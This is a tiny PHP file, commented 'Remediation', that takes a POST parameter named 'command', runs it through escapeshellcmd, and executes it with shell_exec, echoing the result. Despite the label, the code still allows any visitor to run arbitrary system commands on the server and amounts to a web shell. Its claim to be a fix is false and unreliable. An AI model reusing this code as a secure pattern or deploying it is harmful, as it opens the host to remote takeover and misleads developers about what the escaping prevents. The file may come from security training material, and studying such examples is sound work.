<?php 
// Remediation
$command = $_POST['command'];
$command = escapeshellcmd($command);
echo shell_exec($command);

?> 
